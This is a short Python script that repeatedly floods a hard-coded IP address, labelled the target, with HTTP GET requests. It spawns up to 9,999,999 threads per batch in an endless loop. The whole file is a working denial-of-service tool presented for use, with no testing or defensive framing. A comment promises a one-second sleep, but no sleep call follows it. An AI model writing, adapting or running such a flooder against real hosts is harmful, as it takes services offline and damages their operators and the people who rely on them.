import requests
import threading

# Configuration
url = 'http://13.232.128.212/'  # Replace with the target URL
requests_per_second = 9999999   # Number of requests to send per second   


def send_request():
    try:
        response = requests.get(url)
        print(f'Response code: {response.status_code}')
    except requests.exceptions.RequestException as e:
        print(f'Error: {e}')

def worker():
    while True:
        threads = []
        for _ in range(requests_per_second):
            thread = threading.Thread(target=send_request)
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()

         # Sleep for 1 second before sending the next batch

if __name__ == "__main__":
    worker()
